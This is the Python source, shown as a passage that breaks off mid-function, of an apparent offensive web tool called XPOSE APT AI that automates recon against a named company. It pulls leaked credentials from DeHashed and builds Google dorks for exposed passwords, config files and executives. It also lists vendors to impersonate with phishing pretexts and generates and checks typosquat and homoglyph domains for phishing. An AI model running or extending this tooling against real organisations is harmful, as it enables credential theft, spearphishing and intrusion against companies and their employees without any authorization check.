"""
XPOSE APT AI v8.0 - NATION-STATE ATTACK SIMULATION PLATFORM
"From Company Name to Full Compromise - Automated APT Methodology"

Features:
- Auto-Recon Engine: OSINT gathering on company name input
- Google Dorking: 50+ advanced search queries per target
- Supplier/Vendor Intel: Impersonation target research
- Technology Stack Detection: Cloud, email, CRM, security tools
- Professional HTML Phishing: DocuSign, Vendor Invoice, IT, HR templates
- Impact Analysis: Accurate scoring based on actual OSINT findings
- APT Attack Path Generator: Full A-Z attack chains with copy buttons
- Social Engineering Module: Spearphishing, Whaling, Vishing, Smishing
- File Upload: Analyze any file type (images, documents, configs)
- Image Analysis: Vision-capable LLM support for screenshots
- SMART FILE ANALYSIS: Auto-detect nmap, creds, BloodHound, configs
- PENTEST REPORT ANALYSIS: Full document parsing with attack continuation
- DOCX EXTRACTION: Multiple fallback methods for reliable parsing
- ATTACK CHAINING: Next-step commands based on uploaded findings
- Multi-line Input: Shift+Enter for new line, Enter to send
- Conversational AI: Natural buddy-style communication
- Knowledge Base: Auto-loads all .md files from knowledge/ folder

by XPOSE Security
"""

import os
import json
import sqlite3

# Load .env file if exists
from pathlib import Path
env_file = Path(__file__).parent / ".env"
if env_file.exists():
    with open(env_file) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#') and '=' in line:
                key, value = line.split('=', 1)
                os.environ.setdefault(key.strip(), value.strip())
import re
import uuid
import random
import requests
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, Response, g
from pathlib import Path

# Postgres support
HAS_POSTGRES = False
PG_DRIVER = None
try:
    import psycopg2
    from psycopg2.extras import RealDictCursor
    HAS_POSTGRES = True
    PG_DRIVER = "psycopg2"
except ImportError:
    try:
        import pg8000
        HAS_POSTGRES = True
        PG_DRIVER = "pg8000"
    except ImportError:
        pass

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", os.urandom(32).hex())

# Configuration
LLM_PROVIDER = os.environ.get("LLM_PROVIDER", "deepseek")
LLM_API_KEY = os.environ.get("LLM_API_KEY", "") or os.environ.get("DEEPSEEK_API_KEY", "") or os.environ.get("GROQ_API_KEY", "") or os.environ.get("OPENAI_API_KEY", "")
LLM_MODEL = os.environ.get("LLM_MODEL", "deepseek-chat")

SHODAN_API_KEY = os.environ.get("SHODAN_API_KEY", "")
DEHASHED_API_KEY = os.environ.get("DEHASHED_API_KEY", "")
DEHASHED_EMAIL = os.environ.get("DEHASHED_EMAIL", "")
HUNTER_API_KEY = os.environ.get("HUNTER_API_KEY", "")
SECURITYTRAILS_API_KEY = os.environ.get("SECURITYTRAILS_API_KEY", "")
CENSYS_API_ID = os.environ.get("CENSYS_API_ID", "")
CENSYS_API_SECRET = os.environ.get("CENSYS_API_SECRET", "")
VIRUSTOTAL_API_KEY = os.environ.get("VIRUSTOTAL_API_KEY", "")
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")

KNOWLEDGE_PATH = Path("knowledge")

# Database configuration - Vercel compatible
# On Vercel, use Postgres (DATABASE_URL) or /tmp for SQLite
IS_VERCEL = os.environ.get("VERCEL", "") == "1" or os.environ.get("VERCEL_ENV", "") != ""
if IS_VERCEL:
    DATABASE = "/tmp/xpose_v8.db"
else:
    DATABASE = os.environ.get("SQLITE_PATH", "xpose_v8.db")

DATABASE_URL = os.environ.get("DATABASE_URL") or os.environ.get("POSTGRES_URL") or os.environ.get("NEON_DATABASE_URL")
USE_POSTGRES = bool(DATABASE_URL and HAS_POSTGRES)
# Disable streaming on Vercel (serverless doesn't support SSE well)
USE_STREAMING = os.environ.get("USE_STREAMING", "false" if IS_VERCEL else "true").lower() == "true"

# Industry profiles for impact analysis
INDUSTRY_PROFILES = {
    "finance": {"name": "Financial Services", "keywords": ["bank", "finance", "insurance", "investment", "trading", "fintech", "payment"], "high_value_data": ["PII", "financial records", "trading algorithms", "SWIFT access"], "compliance": ["PCI-DSS", "SOX", "GDPR"], "avg_breach_cost": 5.97, "ransomware_multiplier": 1.5, "likely_attacker_types": ["nation-state", "organized crime"], "critical_systems": ["core banking", "trading platforms", "payment gateways"]},
    "healthcare": {"name": "Healthcare", "keywords": ["hospital", "clinic", "healthcare", "medical", "pharma", "biotech"], "high_value_data": ["PHI", "medical records", "research data", "patient PII"], "compliance": ["HIPAA", "HITECH"], "avg_breach_cost": 10.93, "ransomware_multiplier": 2.0, "likely_attacker_types": ["ransomware groups", "nation-state"], "critical_systems": ["EHR systems", "medical devices", "pharmacy systems"]},
    "technology": {"name": "Technology", "keywords": ["software", "tech", "saas", "cloud", "digital", "cyber", "platform"], "high_value_data": ["source code", "API keys", "customer data", "IP"], "compliance": ["SOC2", "ISO27001", "GDPR"], "avg_breach_cost": 4.97, "ransomware_multiplier": 1.3, "likely_attacker_types": ["nation-state", "competitors"], "critical_systems": ["CI/CD pipelines", "cloud infrastructure", "source repos"]},
    "manufacturing": {"name": "Manufacturing", "keywords": ["manufacturing", "industrial", "factory", "production", "automotive"], "high_value_data": ["trade secrets", "designs", "supply chain info", "OT systems"], "compliance": ["NIST", "ICS-CERT"], "avg_breach_cost": 4.47, "ransomware_multiplier": 1.8, "likely_attacker_types": ["nation-state", "competitors"], "critical_systems": ["SCADA/ICS", "ERP", "PLM"]},
    "government": {"name": "Government", "keywords": ["government", "gov", "federal", "state", "municipal", "agency"], "high_value_data": ["classified info", "citizen PII", "infrastructure data"], "compliance": ["FISMA", "FedRAMP", "NIST 800-53"], "avg_breach_cost": 5.56, "ransomware_multiplier": 1.2, "likely_attacker_types": ["nation-state", "hacktivists"], "critical_systems": ["citizen services", "law enforcement"]},
    "energy": {"name": "Energy/Utilities", "keywords": ["energy", "power", "utility", "oil", "gas", "electric", "grid"], "high_value_data": ["SCADA access", "grid data", "operational data"], "compliance": ["NERC CIP", "TSA directives"], "avg_breach_cost": 4.72, "ransomware_multiplier": 2.5, "likely_attacker_types": ["nation-state", "terrorists"], "critical_systems": ["SCADA/ICS", "grid management"]},
    "default": {"name": "General Business", "keywords": [], "high_value_data": ["PII", "financial data", "credentials"], "compliance": ["GDPR"], "avg_breach_cost": 4.45, "ransomware_multiplier": 1.3, "likely_attacker_types": ["ransomware", "opportunistic"], "critical_systems": ["email", "file servers", "databases"]}
}

PENTEST_FRAMEWORKS = {
    "owasp_top10_2021": {"name": "OWASP Top 10 (2021)", "items": ["A01-Broken Access Control", "A02-Cryptographic Failures", "A03-Injection", "A04-Insecure Design", "A05-Security Misconfiguration", "A06-Vulnerable Components", "A07-Auth Failures", "A08-Data Integrity Failures", "A09-Logging Failures", "A10-SSRF"]},
    "owasp_api_2023": {"name": "OWASP API Security Top 10 (2023)", "items": ["API1-BOLA", "API2-Broken Auth", "API3-BOPLA", "API4-Unrestricted Resource", "API5-Broken Function Level Auth", "API6-Unrestricted Sensitive Business Flows", "API7-SSRF", "API8-Security Misconfiguration", "API9-Improper Inventory", "API10-Unsafe API Consumption"]},
    "ptes": {"name": "Penetration Testing Execution Standard", "items": ["Pre-engagement", "Intelligence Gathering", "Threat Modeling", "Vulnerability Analysis", "Exploitation", "Post-Exploitation", "Reporting"]},
    "cyber_kill_chain": {"name": "Lockheed Martin Cyber Kill Chain", "items": ["Reconnaissance", "Weaponization", "Delivery", "Exploitation", "Installation", "C2", "Actions on Objectives"]}
}

# Database functions
_db_initialized = False

def get_postgres_conn():
    if PG_DRIVER == "psycopg2":
        url = DATABASE_URL.replace("postgres://", "postgresql://", 1) if DATABASE_URL.startswith("postgres://") else DATABASE_URL
        return psycopg2.connect(url, cursor_factory=RealDictCursor)
    elif PG_DRIVER == "pg8000":
        import urllib.parse
        parsed = urllib.parse.urlparse(DATABASE_URL)
        return pg8000.connect(user=parsed.username, password=parsed.password, host=parsed.hostname, port=parsed.port or 5432, database=parsed.path[1:])

def get_sqlite_conn():
    conn = sqlite3.connect(DATABASE, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def get_db():
    if 'db' not in g:
        g.db = get_postgres_conn() if USE_POSTGRES else get_sqlite_conn()
    return g.db

def db_execute(query, params=(), fetchone=False, fetchall=False):
    db = get_db()
    try:
        if USE_POSTGRES:
            query = query.replace("?", "%s")
        cursor = db.cursor()
        cursor.execute(query, params)
        if fetchone:
            result = cursor.fetchone()
            return dict(result) if result and hasattr(result, 'keys') else (dict(zip([d[0] for d in cursor.description], result)) if result else None)
        elif fetchall:
            results = cursor.fetchall()
            if not results: return []
            return [dict(r) for r in results] if hasattr(results[0], 'keys') else [dict(zip([d[0] for d in cursor.description], r)) for r in results]
        else:
            db.commit()
            return cursor
    except Exception as e:
        db.rollback()
        raise e

@app.teardown_appcontext
def close_db(error):
    db = g.pop('db', None)
    if db: db.close()

def init_db():
    global _db_initialized
    if _db_initialized: return
    if USE_POSTGRES:
        conn = get_postgres_conn()
        cursor = conn.cursor()
        cursor.execute('CREATE TABLE IF NOT EXISTS projects (id TEXT PRIMARY KEY, name TEXT NOT NULL, type TEXT NOT NULL, target TEXT, framework TEXT, status TEXT DEFAULT \'active\', findings TEXT DEFAULT \'[]\', impact_analysis TEXT DEFAULT \'{}\', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
        cursor.execute('CREATE TABLE IF NOT EXISTS messages (id SERIAL PRIMARY KEY, project_id TEXT NOT NULL, role TEXT NOT NULL, content TEXT NOT NULL, phase TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
        cursor.execute('CREATE TABLE IF NOT EXISTS osint_data (id SERIAL PRIMARY KEY, project_id TEXT NOT NULL, data_type TEXT NOT NULL, data TEXT NOT NULL, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
        conn.commit()
        conn.close()
    else:
        conn = get_sqlite_conn()
        conn.executescript('CREATE TABLE IF NOT EXISTS projects (id TEXT PRIMARY KEY, name TEXT NOT NULL, type TEXT NOT NULL, target TEXT, framework TEXT, status TEXT DEFAULT \'active\', findings TEXT DEFAULT \'[]\', impact_analysis TEXT DEFAULT \'{}\', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP); CREATE TABLE IF NOT EXISTS messages (id INTEGER PRIMARY KEY AUTOINCREMENT, project_id TEXT NOT NULL, role TEXT NOT NULL, content TEXT NOT NULL, phase TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP); CREATE TABLE IF NOT EXISTS osint_data (id INTEGER PRIMARY KEY AUTOINCREMENT, project_id TEXT NOT NULL, data_type TEXT NOT NULL, data TEXT NOT NULL, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);')
        conn.commit()
        conn.close()
    _db_initialized = True

@app.before_request
def ensure_db_initialized():
    init_db()

# OSINT Functions
def gather_comprehensive_osint(target):
    results = {"shodan": {}, "dehashed": {}, "hunter": {}, "crtsh": [], "google_dorks": {}, "suppliers": {}, "technology": {}, "metadata": {"target": target, "timestamp": datetime.now().isoformat(), "sources_queried": []}}
    domain_match = re.search(r'(?:https?://)?(?:www\.)?([a-zA-Z0-9-]+\.[a-zA-Z]{2,})', target)
    domain = domain_match.group(1) if domain_match else target
    results["metadata"]["domain"] = domain
    
    # Shodan
    if SHODAN_API_KEY:
        results["metadata"]["sources_queried"].append("shodan")
        try:
            r = requests.get(f"https://api.shodan.io/dns/domain/{domain}?key={SHODAN_API_KEY}", timeout=30)
            if r.status_code == 200: results["shodan"]["domain"] = r.json()
            r = requests.get(f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query=hostname:{domain}", timeout=30)
            if r.status_code == 200: results["shodan"]["hosts"] = r.json()
        except Exception as e: results["shodan"]["error"] = str(e)
    
    # DeHashed
    if DEHASHED_API_KEY and DEHASHED_EMAIL:
        results["metadata"]["sources_queried"].append("dehashed")
        try:
            r = requests.get(f"https://api.dehashed.com/search?query=domain:{domain}", auth=(DEHASHED_EMAIL, DEHASHED_API_KEY), headers={"Accept": "application/json"}, timeout=30)
            if r.status_code == 200:
                data = r.json()
                for entry in data.get("entries", [])[:100]:
                    if entry.get("password"): entry["password"] = entry["password"][:3] + "***"
                results["dehashed"] = data
        except Exception as e: results["dehashed"]["error"] = str(e)
    
    # Hunter.io
    if HUNTER_API_KEY:
        results["metadata"]["sources_queried"].append("hunter")
        try:
            r = requests.get(f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={HUNTER_API_KEY}", timeout=30)
            if r.status_code == 200: results["hunter"] = r.json()
        except Exception as e: results["hunter"]["error"] = str(e)
    
    results["metadata"]["sources_queried"].append("crtsh")
    try:
        r = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=30)
        if r.status_code == 200:
            data = r.json()
            results["crtsh"] = data[:100] if isinstance(data, list) else []
        else:
            results["crtsh"] = []
    except Exception as e:
        results["crtsh"] = []  # Empty list on error, not dict
        print(f"crtsh error: {e}")
    
    # Google Dorks - generate search queries for manual OSINT
    results["google_dorks"] = generate_google_dorks(domain)
    
    # Technology detection via subdomains
    results["technology"] = detect_technology_stack(domain, results.get("crtsh", []))
    
    # Supplier/Vendor research from subdomains and common patterns
    results["suppliers"] = detect_suppliers_vendors(domain, results)
    
    return results

def generate_google_dorks(domain):
    """Generate Google dork queries for deep OSINT"""
    company = domain.split('.')[0].title()
    dorks = {
        "credentials_exposure": [
            f'site:{domain} inurl:login OR inurl:signin OR inurl:auth',
            f'site:{domain} filetype:env OR filetype:config OR filetype:conf',
            f'site:{domain} password OR passwd OR credentials',
            f'site:pastebin.com "{domain}"',
            f'site:github.com "{domain}" password OR api_key OR secret',
            f'"{domain}" "password" filetype:txt OR filetype:log',
            f'inurl:"{domain}" ext:sql OR ext:db OR ext:backup',
        ],
        "infrastructure": [
            f'site:{domain} inurl:admin OR inurl:administrator OR inurl:wp-admin',
            f'site:{domain} inurl:cpanel OR inurl:webmail OR inurl:portal',
            f'site:{domain} intitle:"index of" OR intitle:"directory listing"',
            f'site:{domain} inurl:vpn OR inurl:remote OR inurl:citrix',
            f'site:{domain} inurl:owa OR inurl:exchange OR inurl:autodiscover',
            f'site:{domain} inurl:sharepoint OR inurl:onedrive',
            f'site:{domain} ext:asp OR ext:aspx OR ext:php',
        ],
        "documents_files": [
            f'site:{domain} filetype:pdf OR filetype:doc OR filetype:docx',
            f'site:{domain} filetype:xls OR filetype:xlsx "confidential"',
            f'site:{domain} filetype:ppt OR filetype:pptx "internal"',
            f'site:{domain} filetype:sql OR filetype:bak',
            f'"{company}" filetype:pdf "employee" OR "staff" OR "organization"',
            f'"{company}" filetype:xlsx "contacts" OR "emails" OR "directory"',
        ],
        "employee_info": [
            f'site:linkedin.com/in "{company}" "employee"',
            f'site:linkedin.com "{domain}" "@{domain}"',
            f'"{company}" "employee directory" OR "staff list"',
            f'site:{domain} "our team" OR "meet the team" OR "about us"',
            f'site:{domain} "@{domain}" email',
            f'"{domain}" "phone" OR "contact" filetype:pdf',
        ],
        "suppliers_vendors": [
            f'"{company}" "vendor" OR "supplier" OR "partner"',
            f'"{company}" "powered by" OR "built by" OR "provided by"',
            f'site:{domain} "thank you" OR "powered by" OR "(c)"',
            f'"{company}" invoice OR contract filetype:pdf',
            f'"{company}" "partnership" OR "collaboration" OR "integration"',
        ],
        "sensitive_info": [
            f'site:{domain} intext:"internal use only" OR intext:"confidential"',
            f'site:{domain} intext:"do not distribute" OR intext:"proprietary"',
            f'"{company}" "org chart" OR "organizational chart" filetype:pdf',
            f'"{company}" "salary" OR "compensation" OR "bonus" filetype:xls',
            f'site:{domain} "api" AND ("key" OR "token" OR "secret")',
            f'"{company}" "security" "assessment" OR "audit" OR "pentest" filetype:pdf',
        ],
        "social_engineering": [
            f'"{company}" CEO OR CFO OR CTO OR CISO site:linkedin.com',
            f'"{company}" "executive assistant" OR "assistant to" site:linkedin.com',
            f'"{company}" "accounts payable" OR "finance" OR "treasury" site:linkedin.com',
            f'"{company}" "IT" OR "helpdesk" OR "support" site:linkedin.com',
            f'site:twitter.com OR site:facebook.com "{company}"',
            f'"{company}" charity OR donation OR sponsorship',
        ],
        "technical_recon": [
            f'site:{domain} ext:xml OR ext:json OR ext:yaml',
            f'site:{domain} inurl:api OR inurl:v1 OR inurl:v2',
            f'site:{domain} "swagger" OR "openapi" OR "graphql"',
            f'site:{domain} ".git" OR ".svn" OR ".env"',
            f'site:github.com "{domain}" OR "{company}"',
            f'site:gitlab.com "{domain}" OR "{company}"',
            f'site:bitbucket.org "{domain}" OR "{company}"',
        ]
    }
    
    # Flatten to list with categories
    all_dorks = []
    for category, queries in dorks.items():
        for query in queries:
            all_dorks.append({"query": query, "category": category, "url": f"https://www.google.com/search?q={query.replace(' ', '+')}"})
    
    return {
        "by_category": dorks,
        "all_queries": all_dorks,
        "total": len(all_dorks)
    }

def detect_technology_stack(domain, crtsh_data):
    """Detect technology stack from subdomains and common patterns"""
    technologies = {
        "cloud_providers": [],
        "email_services": [],
        "crm_erp": [],
        "security": [],
        "collaboration": [],
        "development": [],
        "marketing": [],
        "other": []
    }
    
    subdomains = set()
    if crtsh_data and isinstance(crtsh_data, list):
        for entry in crtsh_data:
            name = entry.get("name_value", "")
            if name:
                subdomains.update(name.split('\n'))
    
    tech_patterns = {
        "cloud_providers": {
            "aws": ["aws", "s3", "ec2", "lambda", "cloudfront", "elasticbeanstalk"],
            "azure": ["azure", "azurewebsites", "azurefd", "microsoft", "office365"],
            "gcp": ["google", "gcp", "appspot", "firebase", "cloudfunctions"],
            "cloudflare": ["cloudflare", "cf"],
        },
        "email_services": {
            "microsoft_365": ["outlook", "exchange", "autodiscover", "owa"],
            "google_workspace": ["mail.google", "smtp.google"],
            "proofpoint": ["proofpoint", "pphosted"],
            "mimecast": ["mimecast"],
        },
        "crm_erp": {
            "salesforce": ["salesforce", "sfdc", "force.com"],
            "sap": ["sap", "s4hana"],
            "oracle": ["oracle", "oraclecloud"],
            "workday": ["workday", "wd"],
            "servicenow": ["servicenow", "service-now"],
        },
        "collaboration": {
            "slack": ["slack"],
            "teams": ["teams", "msteams"],
            "zoom": ["zoom"],
            "atlassian": ["atlassian", "jira", "confluence", "bitbucket"],
            "sharepoint": ["sharepoint", "spo"],
        },
        "security": {
            "okta": ["okta"],
            "duo": ["duo", "duosecurity"],
            "crowdstrike": ["crowdstrike"],
            "paloalto": ["paloalto", "globalprotect"],
            "zscaler": ["zscaler"],
            "sentinelone": ["sentinelone"],
        },
        "development": {
            "github": ["github"],
            "gitlab": ["gitlab"],
            "jenkins": ["jenkins", "ci", "build"],
            "docker": ["docker", "registry"],
            "kubernetes": ["k8s", "kubernetes"],
        }
    }
    
    subdomain_str = " ".join(subdomains).lower()
    for category, tech_dict in tech_patterns.items():
        for tech_name, patterns in tech_dict.items():
            for pattern in patterns:
                if pattern in subdomain_str:
                    if tech_name not in technologies.get(category, []):
                        technologies[category].append(tech_name)
                    break
    
    return {
        "detected": technologies,
        "subdomains_analyzed": len(subdomains),
        "attack_surface": list(subdomains)[:50]  # First 50 subdomains
    }

def detect_suppliers_vendors(domain, osint_results):
    """Detect suppliers and vendors from OSINT data"""
    suppliers = {
        "confirmed": [],
        "likely": [],
        "impersonation_targets": []
    }
    
    # Common B2B vendors that can be impersonated
    common_vendors = [
        {"name": "Microsoft", "domains": ["microsoft.com", "office.com"], "pretext": "Office 365 license renewal"},
        {"name": "DocuSign", "domains": ["docusign.com"], "pretext": "Document awaiting signature"},
        {"name": "Adobe", "domains": ["adobe.com"], "pretext": "License expiration notice"},
        {"name": "Zoom", "domains": ["zoom.us"], "pretext": "Meeting invitation/recording"},
        {"name": "Slack", "domains": ["slack.com"], "pretext": "Workspace notification"},
        {"name": "Dropbox", "domains": ["dropbox.com"], "pretext": "Shared file notification"},
        {"name": "QuickBooks", "domains": ["quickbooks.intuit.com"], "pretext": "Invoice/payment reminder"},
        {"name": "Xero", "domains": ["xero.com"], "pretext": "Invoice awaiting approval"},
        {"name": "FedEx", "domains": ["fedex.com"], "pretext": "Package delivery notification"},
        {"name": "UPS", "domains": ["ups.com"], "pretext": "Delivery update"},
        {"name": "DHL", "domains": ["dhl.com"], "pretext": "Shipping notification"},
        {"name": "Amazon AWS", "domains": ["aws.amazon.com"], "pretext": "AWS billing/security alert"},
        {"name": "Salesforce", "domains": ["salesforce.com"], "pretext": "CRM notification"},
        {"name": "ServiceNow", "domains": ["servicenow.com"], "pretext": "Ticket update"},
        {"name": "Workday", "domains": ["workday.com"], "pretext": "HR action required"},
        {"name": "ADP", "domains": ["adp.com"], "pretext": "Payroll notification"},
        {"name": "Concur", "domains": ["concur.com"], "pretext": "Expense report notification"},
    ]
    
    # Check technology detection for confirmed vendors
    tech = osint_results.get("technology", {}).get("detected", {})
    for category, techs in tech.items():
        for tech_name in techs:
            suppliers["confirmed"].append({
                "name": tech_name.replace("_", " ").title(),
                "category": category,
                "source": "subdomain_analysis"
            })
    
    # Add common vendors as impersonation targets
    for vendor in common_vendors:
        suppliers["impersonation_targets"].append({
            "name": vendor["name"],
            "domains": vendor["domains"],
            "pretext_suggestion": vendor["pretext"],
            "risk_level": "high" if vendor["name"] in ["Microsoft", "DocuSign", "Adobe"] else "medium"
        })
    
    return suppliers

def generate_typosquat_domains(domain):
    """Generate typosquatting domain variations for phishing research"""
    results = {"domain": domain, "variations": [], "categories": {}}
    
    # Parse domain
    parts = domain.rsplit('.', 1)
    if len(parts) != 2:
        return results
    name, tld = parts[0], parts[1]
    
    variations = []
    
    # 1. Missing character
    for i in range(len(name)):
        variations.append({"domain": f"{name[:i]}{name[i+1:]}.{tld}", "type": "missing_char", "description": f"Missing '{name[i]}'"})
    
    # 2. Double character
    for i in range(len(name)):
        variations.append({"domain": f"{name[:i+1]}{name[i]}{name[i+1:]}.{tld}", "type": "double_char", "description": f"Double '{name[i]}'"})
    
    # 3. Adjacent key typos (QWERTY layout)
    adjacent = {'a': 'sqz', 'b': 'vghn', 'c': 'xdfv', 'd': 'erfcxs', 'e': 'rdsw', 'f': 'rtgvcd', 'g': 'tyhbvf', 'h': 'yujnbg', 'i': 'uojk', 'j': 'uikmnh', 'k': 'iolmj', 'l': 'opk', 'm': 'njk', 'n': 'bhjm', 'o': 'iplk', 'p': 'ol', 'q': 'wa', 'r': 'edft', 's': 'wedxza', 't': 'rfgy', 'u': 'yhji', 'v': 'cfgb', 'w': 'qeas', 'x': 'zsdc', 'y': 'tghu', 'z': 'asx'}
    for i, char in enumerate(name.lower()):
        if char in adjacent:
            for adj in adjacent[char][:2]:  # Limit to 2 per char
                variations.append({"domain": f"{name[:i]}{adj}{name[i+1:]}.{tld}", "type": "adjacent_key", "description": f"'{char}' -> '{adj}'"})
    
    # 4. Transposed characters
    for i in range(len(name) - 1):
        variations.append({"domain": f"{name[:i]}{name[i+1]}{name[i]}{name[i+2:]}.{tld}", "type": "transposed", "description": f"Swapped '{name[i]}' and '{name[i+1]}'"})
    
    # 5. Homoglyphs (lookalike characters)
    homoglyphs = {'a': ['@', '4', 'α', 'а'], 'b': ['d', '6', 'ь'], 'c': ['(', '<', 'с'], 'd': ['b', 'cl'], 'e': ['3', 'є', 'е'], 'g': ['9', 'q'], 'i': ['1', 'l', '|', 'і'], 'l': ['1', 'i', '|'], 'm': ['rn', 'nn'], 'n': ['m', 'r'], 'o': ['0', 'θ', 'о'], 's': ['5', '$', 'ѕ'], 't': ['+', '7'], 'u': ['v', 'µ'], 'v': ['u', 'ν'], 'w': ['vv', 'ω'], 'y': ['ý', 'у'], 'z': ['2']}
    for i, char in enumerate(name.lower()):
        if char in homoglyphs:
            for hg in homoglyphs[char][:2]:
                if hg.isascii() and len(hg) == 1:  # Valid for domain names
                    variations.append({"domain": f"{name[:i]}{hg}{name[i+1:]}.{tld}", "type": "homoglyph", "description": f"'{char}' looks like '{hg}'"})
    
    # 6. Different TLDs
    alt_tlds = ['com', 'net', 'org', 'co', 'io', 'info', 'biz', 'xyz', 'online', 'site', 'nl', 'de', 'eu']
    for alt_tld in alt_tlds:
        if alt_tld != tld:
            variations.append({"domain": f"{name}.{alt_tld}", "type": "alt_tld", "description": f"Different TLD: .{alt_tld}"})
    
    # 7. Added words (common patterns)
    prefixes = ['my', 'the', 'get', 'go', 'login', 'secure', 'portal', 'app', 'mail', 'web']
    suffixes = ['online', 'login', 'portal', 'secure', 'app', 'web', 'hr', 'it', 'support', 'help', 'mail', 'cloud', 'services', 'group', 'corp', 'inc']
    for prefix in prefixes[:5]:
        variations.append({"domain": f"{prefix}{name}.{tld}", "type": "prefix", "description": f"Added prefix: {prefix}"})
        variations.append({"domain": f"{prefix}-{name}.{tld}", "type": "prefix", "description": f"Added prefix: {prefix}-"})
    for suffix in suffixes[:8]:
        variations.append({"domain": f"{name}{suffix}.{tld}", "type": "suffix", "description": f"Added suffix: {suffix}"})
        variations.append({"domain": f"{name}-{suffix}.{tld}", "type": "suffix", "description": f"Added suffix: -{suffix}"})
    
    # 8. Subdomain spoofs (using different TLD)
    subdomains = ['login', 'mail', 'portal', 'secure', 'vpn', 'sso', 'auth', 'admin', 'hr', 'it']
    for sub in subdomains[:5]:
        variations.append({"domain": f"{sub}-{name}.{tld}", "type": "subdomain_spoof", "description": f"Spoofed subdomain: {sub}"})
    
    # Remove duplicates and filter valid
    seen = set()
    unique_variations = []
    for v in variations:
        d = v["domain"].lower()
        if d not in seen and len(d) <= 63 and d != domain.lower():
            seen.add(d)
            unique_variations.append(v)
    
    results["variations"] = unique_variations[:100]  # Limit to 100
    
    # Categorize
    for v in results["variations"]:
        cat = v["type"]
        if cat not in results["categories"]:
            results["categories"][cat] = []
        results["categories"][cat].append(v["domain"])
    
    return results

def check_domain_availability(domains):
    """Check if domains are available (basic DNS check)"""
    import socket
    available = []
    registered = []
    
    for domain in domains[:30]:  # Limit to 30 checks
        try:
            socket.gethostbyname(domain)
            registered.append(domain)
        except socket.gaierror:
            available.append(domain)
        except:
            pass
    
    return {"available": available, "registered": registered}

def detect_industry(company_name, osint_data):
    company_lower = company_name.lower()
    website_text = osint_data.get("hunter", {}).get("data", {}).get("organization", "").lower() if osint_data.get("hunter", {}).get("data") else ""
    combined_text = company_lower + " " + website_text
    for industry_key, profile in INDUSTRY_PROFILES.items():
        if industry_key == "default": continue
        for keyword in profile["keywords"]:
            if keyword in combined_text: return profile
    return INDUSTRY_PROFILES["default"]

def calculate_impact_analysis(target, osint_data, industry_profile):
    """Calculate comprehensive impact analysis based on OSINT findings"""
    # Base scores - start higher for realistic assessment
    attack_surface_score = 5
    initial_access_prob = 40
    domain_admin_prob = 25
    exfil_prob = 30
    ransomware_prob = 25
    
    # Count subdomains from multiple sources
    shodan_subs = len(osint_data.get("shodan", {}).get("domain", {}).get("subdomains", []))
    crtsh_raw = osint_data.get("crtsh", [])
    crtsh_subs = len(crtsh_raw) if isinstance(crtsh_raw, list) else 0
    subdomains_count = max(shodan_subs, crtsh_subs)
    
    # Technology detection adds to attack surface
    tech_detected = osint_data.get("technology", {}).get("detected", {})
    tech_count = sum(len(v) for v in tech_detected.values() if isinstance(v, list))
    
    # Subdomains scoring - aggressive scoring
    if subdomains_count >= 100:
        attack_surface_score += 3
        initial_access_prob += 30
    elif subdomains_count >= 50:
        attack_surface_score += 2.5
        initial_access_prob += 25
    elif subdomains_count >= 20:
        attack_surface_score += 2
        initial_access_prob += 20
    elif subdomains_count >= 10:
        attack_surface_score += 1.5
        initial_access_prob += 15
    elif subdomains_count >= 5:
        attack_surface_score += 1
        initial_access_prob += 10
    
    # Open services - critical for initial access
    open_services = len(osint_data.get("shodan", {}).get("hosts", {}).get("matches", []))
    if open_services >= 30:
        attack_surface_score += 2
        initial_access_prob += 20
        domain_admin_prob += 15
    elif open_services >= 15:
        attack_surface_score += 1.5
        initial_access_prob += 15
        domain_admin_prob += 10
    elif open_services >= 5:
        attack_surface_score += 1
        initial_access_prob += 10
        domain_admin_prob += 5
    elif open_services >= 1:
        attack_surface_score += 0.5
        initial_access_prob += 5
    
    # Leaked credentials - MAJOR factor
    leaked_creds = osint_data.get("dehashed", {}).get("total", 0)
    if leaked_creds >= 1000:
        initial_access_prob += 35
        domain_admin_prob += 25
        exfil_prob += 30
        ransomware_prob += 20
        attack_surface_score += 1.5
    elif leaked_creds >= 500:
        initial_access_prob += 30
        domain_admin_prob += 20
        exfil_prob += 25
        ransomware_prob += 15
        attack_surface_score += 1
    elif leaked_creds >= 100:
        initial_access_prob += 20
        domain_admin_prob += 15
        exfil_prob += 20
        ransomware_prob += 10
        attack_surface_score += 0.5
    elif leaked_creds > 0:
        initial_access_prob += 10
        domain_admin_prob += 5
        exfil_prob += 10
        ransomware_prob += 5
    
    # Emails found - social engineering potential
    emails_found = len(osint_data.get("hunter", {}).get("data", {}).get("emails", [])) if osint_data.get("hunter", {}).get("data") else 0
    if emails_found >= 100:
        initial_access_prob += 20
        attack_surface_score += 1
    elif emails_found >= 50:
        initial_access_prob += 15
    elif emails_found >= 20:
        initial_access_prob += 10
    elif emails_found >= 10:
        initial_access_prob += 5
    
    # Technology stack analysis
    if tech_count >= 10:
        attack_surface_score += 0.5
        initial_access_prob += 5
    
    # Check for high-value targets (VPN, Citrix, OWA, etc.)
    high_value_services = ["citrix", "vpn", "owa", "exchange", "rdp", "rdweb", "sso", "login", "remote", "gateway"]
    attack_surface_list = osint_data.get("technology", {}).get("attack_surface", [])
    if isinstance(attack_surface_list, list):
        attack_surface_str = " ".join(str(x) for x in attack_surface_list[:100]).lower()
    else:
        attack_surface_str = ""
    
    # Also check subdomains from crtsh
    crtsh_data = osint_data.get("crtsh", [])
    if isinstance(crtsh_data, list):
        crtsh_str = " ".join([str(c.get("name_value", "") if isinstance(c, dict) else c) for c in crtsh_data[:50]]).lower()
    else:
